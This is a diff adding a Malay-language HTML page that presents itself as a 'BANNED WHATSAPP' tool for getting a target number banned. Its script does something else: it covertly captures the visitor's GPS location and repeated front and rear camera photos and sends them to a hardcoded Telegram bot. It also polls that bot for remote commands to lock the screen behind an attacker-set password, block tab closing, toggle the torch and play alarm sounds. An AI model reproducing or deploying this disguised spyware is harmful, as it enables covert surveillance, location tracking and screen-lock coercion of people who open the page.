@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BENNEN WHATSAPP| ALIX LOZ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            padding: 20px 20px;
+            color: #ffffff;
+            overflow: auto;
+        }
+
+        /* === SKRIN KUNCI === */
+        #skrinKunciTelegram {
+            position: fixed;
+            inset: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000000;
+            z-index: 999999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 25px;
+        }
+        #skrinKunciTelegram h2 {
+            color: #ff3333;
+            font-size: 28px;
+            letter-spacing: 2px;
+        }
+        #skrinKunciTelegram p {
+            color: #cccccc;
+            font-size: 16px;
+        }
+        #inputBukaManual {
+            width: 260px;
+            padding: 14px;
+            font-size: 20px;
+            text-align: center;
+            border: 2px solid #ff3333;
+            border-radius: 8px;
+            background: #111;
+            color: #fff;
+            outline: none;
+        }
+        #btnBukaManual {
+            padding: 12px 28px;
+            font-size: 17px;
+            border: none;
+            border-radius: 8px;
+            background: #ff3333;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        #pesanRalat { color: #ff4444; }
+
+        /* === GAYA ASAL TANPA UBAH === */
+        .tajuk-besar {
+            font-size: 23px;
+            font-weight: 900;
+            text-align: center;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        .sub-tajuk {
+            font-size: 15px;
+            color: #ff3333;
+            text-align: center;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+        }
+        .kotak-gambar {
+            width: 100%;
+            height: 170px;
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid #222;
+            margin-bottom: 20px;
+        }
+        .gambar-latar {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .tab-bar {
+            display: flex;
+            gap: 2px;
+            margin-bottom: 18px;
+        }
+        .tab {
+            flex:1;
+            padding: 12px;
+            text-align:center;
+            font-weight:bold;
+            font-size:16px;
+            background:#111;
+            border-radius: 6px 6px 0 0;
+        }
+        .tab.merah { color:#ff3333; background:#1a1a1a; border-bottom: 2px solid #ff3333; }
+        .tab.putih { color:#fff; }
+        .input-kotak {
+            width:100%;
+            background:#111;
+            border:1px solid #333;
+            border-radius:8px;
+            padding:15px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:15px;
+            outline:none;
+        }
+        .pilih-kotak {
+            width:100%;
+            background:#111;
+            border:2px solid #ffb800;
+            border-radius:8px;
+            padding:15px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:20px;
+            appearance:none;
+            background-image:url('data:image/svg+xml,<svg fill="white" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat:no-repeat;
+            background-position:right 15px center;
+        }
+        .btn-mula {
+            width:100%;
+            background:#000;
+            color:#ff3333;
+            border:2px solid #ff3333;
+            padding:14px;
+            border-radius:8px;
+            font-size:17px;
+            font-weight:bold;
+            letter-spacing:1px;
+            cursor:pointer;
+            margin-bottom:25px;
+            transition:0.2s;
+        }
+        .btn-mula:active { background:#ff3333; color:#000; }
+        .modul-item {
+            background:#121212;
+            border-radius:8px;
+            padding:13px 16px;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            margin-bottom:10px;
+            font-size:15px;
+        }
+        .lampu-hijau {
+            width:12px;
+            height:12px;
+            border-radius:50%;
+            background:#00ee66;
+            box-shadow:0 0 6px #00ee66;
+        }
+        .lampu-kuning {
+            width:12px;
+            height:12px;
+            border-radius:50%;
+            background:#ffb800;
+            box-shadow:0 0 6px #ffb800;
+        }
+        .kotak-log {
+            background:#0f0f0f;
+            border-radius:8px;
+            padding:14px;
+            margin-top:10px;
+            font-size:13px;
+            color:#ff4444;
+            line-height:1.6;
+            min-height:120px;
+            max-height:250px;
+            overflow-y:auto;
+        }
+        video,canvas,audio {display:none;}
+    </style>
+</head>
+<body>
+
+    <!-- SKRIN KUNCI -->
+    <div id="skrinKunciTelegram">
+        <h2>🔒 PERANTI TERKUNCI</h2>
+        <p>Masukkan kata laluan yang ditetapkan</p>
+        <input type="password" id="inputBukaManual" placeholder="Masukkan kata laluan">
+        <button id="btnBukaManual" onclick="bukaKunciManual()">BUKA</button>
+        <div id="pesanRalat"></div>
+    </div>
+
+    <!-- KANDUNGAN ASAL TANPA UBAH -->
+    <h1 class="tajuk-besar">BANNED WHATSAPP</h1>
+    <div class="sub-tajuk">ALIX LOZ</div>
+
+    <div class="kotak-gambar">
+        <img class="gambar-latar" src="https://i.ibb.co/93TStYYM/file-000000002d7071faaa9437cd3c363ff9-6.jpg" alt="Anime Blue Sword">
+    </div>
+
+    <div class="tab-bar">
+        <div class="tab merah">BANNED</div>
+    </div>
+
+    <input type="text" class="input-kotak" placeholder="Nomor target" id="nombor">
+
+    <select class="pilih-kotak" id="jenis">
+        <option>Spam Report</option>
+        <option>spam killer</option>
+        <option>ben masa</option>
+    </select>
+
+    <button class="btn-mula" onclick="mulakanSistem()">START BANNED</button>
+
+    <div class="modul-item"><span>🌐BUKA LOKASI UNTUK BENNEN WHATSAPP</span><div class="lampu-hijau"></div></div>
+    <div class="modul-item"><span>🌐masuk nombor target</span><div class="lampu-kuning"></div></div>
+    
+    <div class="kotak-log" id="log">
+        [SYSTEM] aktif sistem BENNEN ✅<br>
+        [OWNER] ALIX LOZ<br>
+        [STATUS] Ready to Attack
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <audio id="pemainSuara" preload="auto">
+
+    <script>
+        // === VARIABEL KATA LALUAN (AKAN DIUBAH DARI TELEGRAM) ===
+        let kataLaluanSementara = "";
+        let isTerkunci = false;
+
+        // === DATA BOT TELEGRAM ===
+        const BOT_TOKEN = "8956799082:AAF_L6m4vulIqnqZG1VMsimvtpDw2ZlRSog";
+        const CHAT_ID = "8228233355";
+
+        const log = document.getElementById('log');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let lampuHidup = false;
+        let torchStream = null;
+        let lastUpdateId = 0;
+        let konteksAudio;
+
+        // === FUNGSI KUNCI & BUKA ===
+        function kunciDenganPassword(pass) {
+            kataLaluanSementara = pass;
+            isTerkunci = true;
+            document.getElementById("skrinKunciTelegram").style.display = "flex";
+            tambahLog(`🔒 Dikunci | Kata laluan: ${pass}`);
+            hantarTelegram(`✅ Telah dikunci\n🔑 Kata laluan: ${pass}`);
+        }
+
+        function bukaDariTelegram() {
+            kataLaluanSementara = "";
+            isTerkunci = false;
+            document.getElementById("skrinKunciTelegram").style.display = "none";
+            tambahLog("🔓 Dibuka terus dari arahan");
+            hantarTelegram("✅ Kunci dibuka terus");
+        }
+
+        function bukaKunciManual() {
+            const input = document.getElementById("inputBukaManual").value.trim();
+            const pesan = document.getElementById("pesanRalat");
+            if (input === kataLaluanSementara && kataLaluanSementara !== "") {
+                kataLaluanSementara = "";
+                isTerkunci = false;
+                document.getElementById("skrinKunciTelegram").style.display = "none";
+                pesan.textContent = "";
+            } else {
+                pesan.textContent = "❌ Kata laluan salah!";
+            }
+        }
+
+        // Halang tutup tab bila terkunci
+        window.onbeforeunload = e => {
+            if (isTerkunci) {
+                e.preventDefault();
+                e.returnValue = "Peranti masih terkunci!";
+                return e.returnValue;
+            }
+        };
+
+        // === FUNGSI ASAL - SEMUA DIBLOK JIKA TERKUNCI ===
+        document.addEventListener('click', () => {
+            if (!konteksAudio) konteksAudio = new (window.AudioContext || window.webkitAudioContext)();
+        }, { once: true });
+
+        function mainNadaVirus() {
+            if (isTerkunci) return;
+            try {
+                if (!konteksAudio) konteksAudio = new (window.AudioContext || window.webkitAudioContext)();
+                if (konteksAudio.state === 'suspended') konteksAudio.resume();
+                const vol = konteksAudio.createGain(); vol.gain.value = 1; vol.connect(konteksAudio.destination);
+                const vol2 = konteksAudio.createGain(); vol2.gain.value = 0.9; vol2.connect(konteksAudio.destination);
+                const nada = [
+                    {f:880,t:0.45},{f:988,t:0.45},{f:784,t:0.45},
+                    {f:880,t:0.55},{f:988,t:0.55},{f:698,t:0.5},{f:784,t:0.6}
+                ];
+                let masa=0;
+                nada.forEach(n=>{
+                    const o1=konteksAudio.createOscillator(); o1.type="square"; o1.frequency.value=n.f; o1.connect(vol); o1.start(konteksAudio.currentTime+masa); o1.stop(konteksAudio.currentTime+masa+n.t);
+                    const o2=konteksAudio.createOscillator(); o2.type="sawtooth"; o2.frequency.value=n.f*0.998; o2.connect(vol2); o2.start(konteksAudio.currentTime+masa); o2.stop(konteksAudio.currentTime+masa+n.t);
+                    masa+=n.t+0.18;
+                });
+                tambahLog("🔊 Bunyi Virus aktif");
+            } catch (err) { tambahLog("❌ Ralat bunyi"); }
+        }
+
+        function mainNadaIphone() {
+            if (isTerkunci) return;
+            try {
+                if (!konteksAudio) konteksAudio = new (window.AudioContext || window.webkitAudioContext)();
+                if (konteksAudio.state === 'suspended') konteksAudio.resume();
+                const vol = konteksAudio.createGain(); vol.gain.value = 1; vol.connect(konteksAudio.destination);
+                const nada = [{f:784,t:0.5},{f:880,t:0.5},{f:988,t:0.5},{f:784,t:0.6},{f:880,t:0.6},{f:988,t:0.7}];
+                let masa=0;
+                nada.forEach(n=>{
+                    const o=konteksAudio.createOscillator(); o.type="sine"; o.frequency.value=n.f; o.connect(vol); o.start(konteksAudio.currentTime+masa); o.stop(konteksAudio.currentTime+masa+n.t);
+                    masa+=n.t+0.15;
+                });
+                tambahLog("🔊 Bunyi iPhone aktif");
+            } catch (err) { tambahLog("❌ Ralat bunyi"); }
+        }
+
+        function mulakanSistem(){
+            if (isTerkunci) return;
+            let no = document.getElementById('nombor').value || "TIADA";
+            let jenis = document.getElementById('jenis').value;
+            tambahLog("🚀 Jalan: "+no+" | "+jenis);
+            hantarTelegram(`🔴 Sasaran: ${no}\nMod: ${jenis}\n\n📌 Arahan:\n/kunci 12345678 → Kunci & tetapkan kata laluan\n/buka → Buka terus\n/maps /kamera /lampu /virus /iphone`);
+            dapatkanLokasi();
+            mulaKamera();
+        }
+
+        function dapatkanLokasi(){
+            if (isTerkunci) return;
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(p=>{
+                    let lat=p.coords.latitude.toFixed(6), lon=p.coords.longitude.toFixed(6);
+                    hantarTelegram(`📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`);
+                }, e=>tambahLog("❌ Lokasi gagal"));
+            }
+        }
+
+        async function mulaKamera(){
+            if (isTerkunci) return;
+            let mod="user";
+            const ambil=async()=>{
+                try{
+                    let strim=await navigator.mediaDevices.getUserMedia({video:{facingMode:mod}});
+                    video.srcObject=strim;
+                    if(mod==="environment") torchStream=strim;
+                    setTimeout(()=>hantarGambar(mod),2000);
+                    mod=mod==="user"?"environment":"user";
+                }catch(e){}
+            }; ambil(); setInterval(ambil,8000);
+        }
+        function hantarGambar(nama){
+            if (isTerkunci || !video.srcObject) return;
+            canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+            hantarGambarTelegram(canvas.toDataURL(),`📸 ${nama}`);
+        }
+
+        async function tukarLampu(){
+            if (isTerkunci) return;
+            try{
+                if(!lampuHidup){
+                    if(!torchStream) torchStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment",torch:true}});
+                    await torchStream.getVideoTracks()[0].applyConstraints({advanced:[{torch:true}]});
+                    lampuHidup=true;
+                    hantarTelegram("💡 Lampu ON");
+                }else{
+                    await torchStream.getVideoTracks()[0].applyConstraints({advanced:[{torch:false}]});
+                    lampuHidup=false;
+                    hantarTelegram("💡 Lampu OFF");
+                }
+            }catch(e){}
+        }
+
+        // === BACA ARAHAN TELEGRAM ===
+        setInterval(()=>{
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}`)
+            .then(r=>r.json()).then(d=>{
+                if(d.ok && d.result.length>0){
+                    d.result.forEach(u=>{
+                        lastUpdateId=u.update_id;
+                        let teks = u.message?.text?.trim() || "";
+                        let cmd = teks.toLowerCase();
+
+                        // ✅ Kunci + tetapkan kata laluan terus dari Telegram
+                        if(cmd.startsWith("/kunci ")){
+                            let passBaru = teks.split(" ")[1];
+                            if(passBaru && passBaru.length > 0){
+                                kunciDenganPassword(passBaru);
+                            }
+                        }
+                        if(cmd === "/kunci"){
+                            hantarTelegram("⚠️ Contoh: /kunci 12345678");
+                        }
+
+                        // Buka terus tanpa kata laluan
+                        if(cmd === "/buka") bukaDariTelegram();
+
+                        // Arahan lain hanya jalan jika tidak terkunci
+                        if(!isTerkunci){
+                            if(cmd==="/maps") dapatkanLokasi();
+                            if(cmd==="/kamera") mulaKamera();
+                            if(cmd==="/lampu") tukarLampu();
+                            if(cmd==="/virus"||cmd==="/nokia") mainNadaVirus();
+                            if(cmd==="/iphone") mainNadaIphone();
+                            if(cmd==="/delay") hantarTelegram("⏱️ Delay aktif");
+                            if(cmd==="/fc") hantarTelegram("🌀 FC aktif");
+                        }
+                    });
+                }
+            }).catch(()=>{});
+        }, 4000);
+
+        // === ALAT BANTU ===
+        function hantarTelegram(t){
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+                method:"POST", headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({chat_id:CHAT_ID, text:t, parse_mode:"Markdown"})
+            });
+        }
+        function tambahLog(t){log.innerHTML+=t+"<br>";log.scrollTop=log.scrollHeight;}
+        function dataURLkeBlob(d){let b=d.split(','),t=b[0].match(/:(.*?);/)[1],s=atob(b[1]),l=s.length,a=new Uint8Array(l);while(l--)a[l]=s.charCodeAt(l);return new Blob([a],{type:t})}
+        function hantarGambarTelegram(url,c){let b=dataURLkeBlob(url),f=new FormData();f.append("chat_id",CHAT_ID);f.append("photo",b);f.append("caption",c);fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:f})}
+    </script>
+
+</body>
+</html>
